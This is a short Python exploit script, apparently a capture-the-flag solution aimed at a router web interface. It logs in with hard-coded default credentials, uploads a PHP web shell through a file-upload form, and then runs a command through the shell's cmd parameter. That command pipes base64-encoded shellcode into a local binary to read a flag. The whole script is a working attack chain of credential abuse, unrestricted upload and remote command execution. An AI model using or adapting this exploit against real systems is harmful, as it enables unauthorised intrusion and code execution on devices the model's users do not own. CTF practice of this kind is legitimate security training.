import requests
import sys 
import random
import string

IP, PORT = sys.argv[1], sys.argv[2]
URL = f"http://{IP}:{PORT}/"

username = "admin"
password = "router@123"


session = requests.Session()


random_filename = "9GZzHITWfO.php"
#TODO: Add your exploit code here

def login():
    # Login to the router
    login_url = URL + "login.php"
    data = {
        "username": username,
        "password": password
    }
    response = session.post(login_url, data=data)

def file_uperload():
    # File upload
    upload_url = URL + "index.php"
    files = {'files': open('9GZzHITWfO.php','rb')}
    values = {
        'upload_file' : random_filename , 
        'DB':'photcat' , 
        'OUT':'csv' , 
        'SHORT':'short'
    }
    response = session.post(upload_url, data=values ,files=files)
def exploit():
    # Exploit
    exploit_url = URL + f"uploads/{random_filename}?cmd=echo SLguLi9mbGFnAFBIx8cDAAAASInmSMfCAAAAAEnHwgAAAABIx8ABAQAADwVIx8cBAAAASMfGBAAAAEjHwgAAAABJx8JQAAAASMfAKAAAAA8F | base64 -d | /home/pwn/read_file 3< /tmp"
    response = session.get(exploit_url)
    print(f"FLAG!{response.text[16:]}!")

login()
file_uperload()
exploit()